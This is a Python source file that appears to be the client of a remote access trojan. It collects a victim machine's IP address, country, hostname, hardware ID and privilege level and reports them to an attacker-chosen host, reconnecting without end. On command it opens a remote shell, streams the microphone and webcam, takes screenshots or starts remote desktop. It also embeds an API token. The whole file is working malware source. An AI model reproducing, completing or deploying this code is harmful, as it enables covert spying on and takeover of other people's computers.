import socket
import time
import platform
import requests
from wmi import WMI
import json
import threading
from .shell import create_shell
from .features.audio import start_audio_stream
from .features.terminal import terminal
from .features.screenshot import send_screenshot
from .features.webcam import send_webcam_stream
from .features.remote_desktop import start_remote_desktop
from .account_type import check_account_type

def get_client_info():
    system = platform.system()
    version = platform.version().split('.')[0]
    os = f"{system} {version}"
    try:
        response = requests.get('https://ipv4.jsonip.com', timeout=5)
        data = response.json()
        ip = data.get('ip')
        response = requests.get(f'https://api.findip.net/{ip}/?token=000e63e9964845a693b5dcd40dfd6a9d', timeout=5)
        data = response.json()
        country_en = data['country']['names']['en']
    except:
        ip = None
        country_en = None

    shell, stdout_queue, stderr_queue = create_shell()

    client_info = { 
        "new_client": {
            "IP": ip, 
            "PC Name": platform.node(),  
            "PC ID": WMI().Win32_ComputerSystemProduct()[0].UUID,
            "OS": os, 
            "Account Type": check_account_type(), 
            "Country": country_en,
        },
        "shell": shell,
        "stdout_queue": stdout_queue,
        "stderr_queue": stderr_queue
    }
    return client_info

def start_connection(HOST, PORT):
    client_info = None
    shell = None
    stdout_queue = None
    stderr_queue = None

    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((HOST, PORT))
            
            if client_info is None:
                client_info = get_client_info()
                shell = client_info.pop('shell')
                stdout_queue = client_info.pop('stdout_queue')
                stderr_queue = client_info.pop('stderr_queue')
            
            client_info_json = json.dumps(client_info)
            client_socket.sendall(client_info_json.encode('utf-8'))

            while True:
                data = client_socket.recv(1024).decode('utf-8').strip()
                if not data:
                    break
                
                try:
                    data = json.loads(data)
                except json.JSONDecodeError:
                    continue
                
                if data.get("audiostream") is not None:
                    thread = threading.Thread(target=start_audio_stream, args=(client_socket,))
                    thread.daemon = True
                    thread.start()

                elif data.get("terminal") is not None:
                    thread = threading.Thread(target=terminal, args=(data, client_socket, shell, stdout_queue, stderr_queue))
                    thread.daemon = True
                    thread.start()

                elif data.get("screenshot") is not None:
                    thread = threading.Thread(target=send_screenshot, args=(client_socket,))
                    thread.daemon = True
                    thread.start()

                elif data.get("webcam") is not None:
                    thread = threading.Thread(target=send_webcam_stream, args=(client_socket,))
                    thread.daemon = True
                    thread.start()

                elif data.get("remote_desktop") is not None and data.get("port") is not None:
                    thread = threading.Thread(target=start_remote_desktop, args=(data, client_socket,))
                    thread.daemon = True
                    thread.start()

        except (socket.error, ConnectionResetError):
            time.sleep(1)
            continue
        except Exception as e:
            time.sleep(1)
            continue
        finally:
            if client_socket:
                client_socket.close()